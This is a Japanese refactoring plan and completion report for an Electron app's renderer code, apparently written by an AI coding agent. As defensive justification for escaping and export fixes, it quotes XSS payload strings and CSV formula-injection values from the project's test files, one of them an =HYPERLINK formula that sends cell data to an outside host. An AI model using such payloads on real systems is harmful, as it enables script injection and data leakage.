# リファクタリング手順書（v0.5 → v0.6）

> **実施完了 2026-08-28。** 結果は末尾の「実施結果」を参照。以下は着手前に合意した内容をそのまま残したもの。
>
> 作成 2026-08-28。着手前の合意用。承認後にこの手順どおり実行する。
> 対象：`src/renderer/` のコンポーネント分割と重複除去。`assignment.ts` / `optimizer.ts` / `calcEngine.ts` の**数式・定数・アルゴリズムには触れない**（CLAUDE.md §9）。

## 0. 目的と不変条件

**目的**：表示層に散った重複定義を集約し、`renderer.ts`（573行）を設計書§1・CLAUDE.md §5 の「表示専用モジュール」方針に戻す。

**不変条件（各ステップで確認する）**

| 項目 | 基準値 |
|---|---|
| `npm test` | 37件 pass / 0 fail |
| `npm run lint` | 0 warnings / 0 errors |
| 実データ4課題の結果 | `SHA256(all)=d0a984052ef37fa98d35962287a0aacd79902a33af092f91914dfa02dfc52f9b` |

ベースラインは `docs/baseline-snapshot.txt` に取得済み（2026-08-28・`human_resources_100.csv`）。
再取得スクリプトは作業用に `_snapshot.ts`（リポジトリ直下）に置いてある。**Step 7 で削除する。**

参考：実測値（課題1 293ms / 2 93ms / 3 157ms / 4 567ms）。CLAUDE.md §8 の記録と同水準。

**現在のファイル規模**

```
renderer.ts   573行 ★分割対象   whatifPanel.ts 345行
optimizer.ts  281行             index.html     278行
dashboard.ts  264行             csv.ts         191行
assignment.ts 179行             compareTasks.ts 179行
calcEngine.ts 181行             constants.ts   149行
styles.css    127行             whatif.ts      118行
compareHiring.ts 90行           validation.ts   88行
types.ts       83行             main.ts         74行
reasonText.ts  56行
```

---

## 1. 着手前の整理（Step 0）

現在 3ファイルが未コミット（`dashboard.ts` / `index.html` / `renderer.ts`）。内容は「追加機能タグの撤去」と「`human_resources_100.csv` という具体ファイル名の一般化」で、リファクタとは目的が別。

→ **先に別コミットとして確定させる。** リファクタ差分と混ざると Step 単位の revert ができなくなるため。

このとき合わせて判断が要るもの（**C-4**）：撤去漏れが2箇所ある。

- `index.html:139` — `<span class="addon-tag">＋B-2 余裕表示</span>` が残っている
- `index.html:17-19` — トップバーのバッジが `A-1` / `7` / `14`（社内の機能番号）のまま

---

## 2. 発見事項

### A. 挙動不変のリファクタ（承認不要・そのまま実施）

#### A-1. 表示ヘルパの重複を集約 → 新規 `format.ts` / `dom.ts`

| 重複 | 箇所 |
|---|---|
| `UNIT_LABEL`（A事業部/B事業部/C事業部） | `dashboard.ts:13` `whatifPanel.ts:6` `reasonText.ts:6` ＋ `csv.ts:167` のローカル `unitLabel` |
| `UNIT_VAR`（var(--a)…） | `dashboard.ts:14` `compareTasks.ts:9` `compareHiring.ts:7` |
| `$(id)` = getElementById | `dashboard.ts:17` `whatifPanel.ts:8` |
| `pill(kind, text)` | `dashboard.ts:53` `whatifPanel.ts:12` |
| `oku(n)` = `${n.toFixed(2)}億円` | `dashboard.ts:21` `whatifPanel.ts:16` ／ 亜種 `oku1()` `compareTasks.ts:39` |
| `PROFIT_SCALE = 30` | `compareTasks.ts:17` `compareHiring.ts:8` |

- `src/renderer/format.ts` … `UNIT_LABEL` / `UNIT_VAR` / `oku` / `oku1` / `deltaText` / `pill` / `signed()` / `escapeHtml`（B-5）
- `src/renderer/dom.ts` … `$` / `setHtml`
- `PROFIT_SCALE` は `constants.ts` へ（表示スケールだが2画面で共有する定数のため）

#### A-2. `UNIT_IDS` / `TASK_IDS` の徹底

`constants.ts:5` に `UNIT_IDS` があるのにローカル再定義が残っている：`whatifPanel.ts` の 123 / 211 / 227 / 255 / 267 / 309 行、`reasonText.ts:30`。
課題側は配列定数が無く `[1,2,3,4] as TaskId[]` がリテラルで散在：`compareTasks.ts:31,135` `whatifPanel.ts:36`。
→ `constants.ts` に `TASK_IDS` を追加し、両方を単一の参照点にする。

#### A-3. 充足率ゲージの重複 → 新規 `gauge.ts`

`dashboard.ts:26-51,229-251` と `whatifPanel.ts:279-323` が `GAUGE_BANDS` / `SEG_WIDTHS` / `ratePosition()` / ゲージHTML生成までほぼ丸ごと同一。
→ `gauge.ts` に `renderGaugeHtml(units, params)` として1本化。
**ただし現状の2実装は挙動が違う（B-1）**ため、どちらに寄せるか決めてから着手する。

#### A-4. `renderer.ts`（573行）の分割

現状 1ファイルが「アプリ状態・画面遷移・CSV取込UI・取込レポートのDOM生成・実行/出力ボタン・What-if の状態と全イベント配線」を全部持っている。
`renderImportReport`(414-458) / `renderHiringImportOk`(404-411) / `renderHiringImportError`(388-401) は**表示専用の処理**であり、CLAUDE.md §5 の方針（表示は専用モジュール）から外れている。

```
renderer.ts (573) →
  renderer.ts        目標150行前後  アプリ状態・go()・実行/出力ボタン・初期化
  importPanel.ts     新規          setupDropzone・#p1/#p5 の取込レポート描画
  whatifController.ts 新規         state.whatIf・resetWhatIf・initWhatIfPanel・renderWhatIfAll
```

#### A-5. #p6 再描画ロジックの重複

`renderWhatIfAll()`(118-153) と人数配分スライダーの `input` ハンドラ(196-213) が、サマリー・事業部別テーブル・理由・ゲージ・差分・社員一覧の更新をほぼ同じ順で二重に書いている。
→ `renderWhatIfResults(wi)` に抽出し、両方から呼ぶ（スライダー側だけ `renderHeadcountCard` を呼ばない、という差分は引数で表す）。

#### A-6. 死んだコード・インライン型

- `clearParamsErrorsGate`（`whatifPanel.ts:192`）は**どこからも呼ばれていない**（grep一致は定義行のみ）。B-2 の修正で不要になるため削除。
- `{ from: UnitId; to: UnitId; count: number }[]` が `whatif.ts:103` と `whatifPanel.ts:326` に直書き → `types.ts` に `AssignmentDiff` を追加。

#### A-7. `package.json` の残骸

```json
"packaging": { "name": "...", "productneme": "マイアプリ" }   ← タイポ・未使用
"scripts": { "packaging": "electron-packager . --overwrite" }  ← 配布は electron-builder
```

electron-packager 由来の残骸。README の Windows 配布手順は electron-builder のみを使っている。→ 両方削除。
併せて `version: "0.2.0"` を git のタグ（v0.5）に合わせて `0.5.0` にする。

---

### B. 挙動が変わる修正（要合意）

#### B-1. ゲージのマーカー位置が #p3 と #p6 で一致しない ★実データで顕在化

```
dashboard.ts:32    pos = 60 + Math.min((rate - 1.0) / 0.6, 1) * 40   // 100%〜160%を右40%に割当
whatifPanel.ts:301 pos = Math.min(100, 60 + ((rate - 1.0) / 1.0) * 40) // 100%〜200%を右40%に割当
```

実データ課題3のB事業部は充足率 **1.4**（`docs/baseline-snapshot.txt`）。
このとき #p3 のマーカーは **86.7%** の位置、#p6 は **76.0%** の位置。**10.7ポイントずれる**。同じ数値を見ているのに画面で位置が違う。

- **推奨：dashboard 側（`/0.6`）に寄せる。** `SURPLUS_TABLE` の最終境界 `maxRate: 1.6` と対応が取れており、帯ラベル「100%以上」の右端＝過剰補正0.8の入口という読み方ができる。
- 対して whatifPanel 側の `/1.0`（＝200%）は根拠となる定数が無い。

→ **A-3 の共通化はこの決着後**。合意が取れるまでは A-3 を保留する。

#### B-2. 前提パラメータのエラー解消後も「この前提で再最適化」が無効のまま

`whatifPanel.ts:177-190`：

```ts
export function renderParamsErrors(errors) {
  if (errors.length === 0) { el.innerHTML = ''; return }   // ← disabled を戻さずに return
  ...
  if (btn) btn.disabled = true                              // ← 立てるだけ
}
```

復帰用の `clearParamsErrorsGate` は定義されているが呼ばれていない（A-6）。

**再現手順**：#p6 →「② 前提パラメータ」→ 適正人数を `0` にする（エラー表示・ボタン無効）→ `40` に戻す（エラー表示は消える）→ **ボタンは無効のまま。画面を離れて戻っても復帰しない。**

→ 修正：`renderParamsErrors` の末尾を `if (btn) btn.disabled = errors.length > 0` に一本化し、`clearParamsErrorsGate` を削除。

#### B-3. What-if 母集団の件数表示が「基準100名」固定

`whatifPanel.ts:105`：

```ts
const total = input.baseCount + input.selectedIds.size
`合計 ${total} 名（基準100名 + 採用${input.selectedIds.size}名）`
```

`baseCount` は可変なのに文言だけ100固定。①で100名以外を取り込むと合計と内訳が合わなくなる。
→ `基準${input.baseCount}名` に修正。

#### B-4. ゲージ帯ラベルが標準値のハードコード

`GAUGE_BANDS` のラベル（`70%（0.50）` 等）は `SHORTAGE_TABLE` と同じ値の二重定義。
#p6 は前提パラメータで適正人数を変えられるため、**充足率の計算だけ動いて帯ラベルは標準値のまま**という食い違いが起きる。

→ A-3 の `gauge.ts` で `params.shortageTable` から帯ラベルを生成すれば二重定義が消える（推奨）。ただし表示文言の生成方法が変わるため合意対象とする。

#### B-5. CSV由来の文字列を innerHTML に無エスケープで埋めている

プロジェクト内に `escapeHtml` 相当は存在しない（`src/` 全体で0件）。CSV由来の値が入る箇所：

| 箇所 | 埋め込む値 |
|---|---|
| `renderer.ts:422` | #p1 プレビューの `e.id` ほか |
| `renderer.ts:397,447` | 検証エラー表の `e.column` / `e.actual` |
| `dashboard.ts:260` | #p3 配置結果プレビューの `e.id` |
| `whatifPanel.ts:255` | #p6 社員一覧の `e.id`（`data-whatif-move` 属性値にも） |

`本課題　必要資料\テストケース\hire_test04_xss_script_injection.csv` は社員番号に `<script>alert('xss')</script>` / `<img src=x onerror=alert(1)>` / `"><svg onload=alert(1)>` を持つ。**資料側で想定済みの異常系。**

`contextIsolation: true` は外部由来スクリプトの隔離であって、レンダラー自身が `innerHTML` に書いたHTMLの実行は防がない。

→ `format.ts` に `escapeHtml()` を置き、**CSV由来の値のみ**通す（自前定数・数値は対象外）。属性値へ入る `e.id` は属性用のエスケープも掛ける。

#### B-6. CSV出力にフォーミュラインジェクション対策とクォートがない

`csv.ts:159 buildAssignmentCsv` は値を素で `join(',')` している。
`テストケース\hire_test03_csv_formula_injection.csv` は社員番号に `=1+1` / `+1+1` / `-1+1` / `@SUM(1+1)` / `=HYPERLINK("http://example.com/"&A1,"click")` を持つ。

補足：入力側の `splitLines` + `split(',')` はクォート付きフィールド非対応のため、同ファイルの `"=HYPERLINK(...)"` 行は現状「列数不一致」エラーになり**取り込めない**（＝入力側で偶然止まっている）。素の `=1+1` は取り込めて、そのまま出力CSVに載る。

→ 出力側の `'` 前置・カンマ/引用符のクォート付与は**入出力の往復互換に影響する**（設計書§8「入出力往復可能」）ため、**今回のリファクタとは別に可否を判断したい**。パーサをRFC4180準拠にするなら入力側も同時に直す必要があり、規模が変わる。

---

### C. 今回はスコープ外とする提案（別タスク）

| # | 内容 | 理由 |
|---|---|---|
| C-1 | インライン `style=` の styles.css 移行 | `whatifPanel.ts` / `dashboard.ts` に多数。デスクトップの `参考リンク集`（shadcn-ui / TailwindUI / Fluent CommandBar / NNGroup メニュー設計）を踏まえたUI整理は、挙動不変のリファクタとは目的が別。まとめて別タスクに切る |
| C-2 | `upperBoundRawTotal` の quickselect 化 | `docs/pruning-plan.md` ②未実装。性能改善であってリファクタではない |
| C-3 | `compareTasks.ts` のモジュールレベル可変状態（`barMode` / `cachedResults` / `cachedBaseline`）の整理 | テスト可能性の改善。今回の分割対象は renderer.ts に絞る |
| C-4 | `index.html` の機能番号バッジ残り | Step 0 の未コミット差分に含めるか要判断（§1参照） |

---

## 3. 実行手順

各 Step の末尾で必ず `npm run lint` → `npm test` → `node --experimental-strip-types _snapshot.ts` の SHA 照合。**Step ごとに1コミット。**

| Step | 内容 | 該当 | SHA |
|---|---|---|---|
| 0 | 未コミット差分を確定（+ C-4 の判断） | — | 不変 |
| 1 | `format.ts` / `dom.ts` 新設、`constants.ts` に `TASK_IDS` / `PROFIT_SCALE` 追加。呼び出し側は未変更 | A-1 A-2 | 不変 |
| 2 | 表示4モジュール（dashboard / compareTasks / compareHiring / whatifPanel / reasonText / csv）を新基盤へ載せ替え | A-1 A-2 A-6 | 不変 |
| 3 | `gauge.ts` 新設・2実装を1本化 | A-3 + **B-1 B-4 の決着後** | 不変（表示のみ） |
| 4 | `escapeHtml` 適用 | **B-5** | 不変 |
| 5 | `renderer.ts` 分割（`importPanel.ts` / `whatifController.ts`）・#p6 再描画の重複解消 | A-4 A-5 | 不変 |
| 6 | 小修正：再最適化ボタンのゲート・母集団件数の文言・package.json 整理 | **B-2 B-3** A-7 | 不変 |
| 7 | 最終検証・`_snapshot.ts` 削除・`README.md` / `CLAUDE.md §5` の構成表更新 | — | 不変 |

---

## 4. 検証

**自動**

- `npm test` 37件 pass を全 Step で維持
- 実データ4課題の `SHA256(all)` が **d0a98405…** のまま
  - B-5 は #p3 プレビューのHTML文字列を変えるが、`buildAssignmentCsv` / `generateReasonText` は通さないので csv・reason 各ハッシュは不変
- 追加テスト
  - `escapeHtml`：`hire_test04` の4パターンが `<script>` 等を実行可能な形で出力しないこと
  - `ratePosition`：B-1 決着後の単一実装で `rate = 0.4 / 0.7 / 0.9 / 1.0 / 1.4 / 1.6 / 2.0` の位置を固定
  - 再最適化ゲート：`validateParams` が空配列を返す入力でボタンが有効に戻ること

**手動（`npm run dev`）**

- #p3 と #p6 のゲージが同じ充足率で同じ位置を指すこと（B-1）
- 異常系CSV：`~/development/資料/テストケース/` の `採用02〜07`（ID衝突・インジェクション・ゼロコスト・5000名）と `形状01〜09` を #p1 / #p5 に投入
- 4画面（#p3 / #p4 / #p5 / #p6）の表示が分割前と一致すること

## 5. リスクと巻き戻し

- Step 単位コミットのため、SHA 不一致が出た Step だけ `git revert` できる
- **触らないファイル**：`assignment.ts` / `optimizer.ts` / `calcEngine.ts` / `validation.ts` / `whatif.ts`（`constants.ts` は `TASK_IDS` / `PROFIT_SCALE` / `UNIT_LABEL` の**追加のみ**、既存の値は変更しない）
- CLAUDE.md §7 の確定済み設計判断（辞書式目的関数・境界の帰属・丸め・適正人数据え置き・タイブレーク・決定性）はいずれも本手順の対象外

---

## 6. 着手前に決めていただきたいこと

| # | 論点 | 推奨 |
|---|---|---|
| B-1 | ゲージのマーカー位置をどちらに寄せるか | dashboard 側（`/0.6`）。`SURPLUS_TABLE` の 1.6 と対応が取れる |
| B-4 | ゲージ帯ラベルを `shortageTable` から生成するか | 生成する（二重定義が消え、#p6 のパラメータ変更に追従する） |
| B-5 | `escapeHtml` を今回のスコープに入れるか | 入れる（資料に異常系CSVがあり、修正は局所） |
| B-6 | CSV出力のインジェクション対策 | **今回は見送り**、別タスク。入力パーサのRFC4180対応まで必要になり規模が変わる |
| C-4 | `index.html` に残る機能番号バッジを撤去するか | Step 0 で撤去（未コミット差分の方針と揃える） |

---

# 実施結果（2026-08-28）

§6 は**すべて推奨どおりで承認**され、Step 0〜7 を実行した。

## コミット

| Step | コミット | 内容 |
|---|---|---|
| 0 | `2478b3c` | 機能番号バッジの撤去とベースライン取得 |
| 1 | `7149935` | `format.ts` / `dom.ts` 新設 |
| 2 | `bcb0946` | 表示6モジュールを新基盤へ載せ替え |
| 3 | `51931ea` | ゲージを `gauge.ts` に1本化（B-1 / B-4） |
| 4 | `3723723` | `escapeHtml` 適用（B-5） |
| 5 | `6e2d5c7` | `renderer.ts` 分割（573→170行） |
| 6 | `d01f02e` | 再最適化ゲート修正・母集団件数の文言・package.json 整理（B-2 / B-3 / A-7） |
| 7 | `c316872` | `CLAUDE.md` / `README.md` の更新 |

## 不変条件の達成状況

| 項目 | 着手前 | 完了時 |
|---|---|---|
| `npm test` | 37件 pass | **52件 pass**（gauge 6件・format 9件を追加） |
| `npm run lint` | 0 / 0 | 0 / 0 |
| 実データ4課題 SHA256 | `d0a98405…` | **`d0a98405…`（完全一致）** |
| `vite build` | — | 成功（22 modules / 47.7 kB） |
| Electron 実機E2E | — | 19項目すべて PASS |
| 最大ファイル | 573行（renderer.ts） | 361行（whatifController.ts） |

## 修正した不具合の実測

- **B-1**：#p3 の表示は不変。#p6 のマーカーは 充足率1.14 で 65.7%→69.5%、1.4 で 76.0%→86.7% に補正された。
- **B-4**：生成したラベルは3事業部とも旧ハードコードと文字列完全一致。見た目の変化なし。
- **B-2**：適正人数を 0→40 と戻す操作を E2E に入れ、修正前 FAIL・修正後 PASS を確認。
- **B-5**：6箇所に適用。`hire_test04` の4パターンを固定するテストを追加。

## 手順書からの逸脱

- **`version` は 0.5.0 ではなく 0.6.0 にした。** 0.5.0 は本作業*前*の状態を指す番号で、Step 6 が入った時点で
  実態と合わなくなるため。
- **Step 0 の「未コミット差分の確定」は別セッションが先に済ませていた**（`021aa1c`）。Step 0 では C-4 の撤去漏れ
  （`index.html:139` の `addon-tag` とトップバーの `A-1`/`7`/`14` バッジ）だけを対象にした。
  トップバーは `📊` / `👥` / `🔀` に置換（`🏠` と同じ扱い）。

## 次に触る人への申し送り

- `compareHiring.ts` の「利益の伸びが最も大きいのは○事業部（**+**…）」は符号が `+` 固定。全事業部の利益が減る
  採用シナリオでは `+-1.00億円` と表示される。B-3 と同種の文言バグだが、手順書に無いため据え置いた。
- `@electron/packager` が devDependency に残っている（`packaging` スクリプト削除で未使用）。
  `package-lock.json` を書き換える操作になるため見送った。
- Electron 起動時に CSP 未設定の開発時警告が出る。`index.html` に `Content-Security-Policy` を入れると消せる。
- **B-4 の書きぶりの訂正**：本手順書では「#p6 のパラメータ変更に追従する」としたが、`shortageTable` は現状UIから
  編集できないため、実際の効果は「二重定義の解消」に留まる。表示上の不整合は起きていなかった。
- **B-6 は未対応のまま**。`README.md` の未決事項と `CLAUDE.md §8` の既知の罠に記載済み。
- 検証に使った Electron E2E（`dist/` を実機で読み込み、CSVのdropを合成して①〜⑥を操作する19項目）は
  規約どおり一時スクリプトとして削除した。恒久的な回帰テストとして `test/` に入れる価値はある。
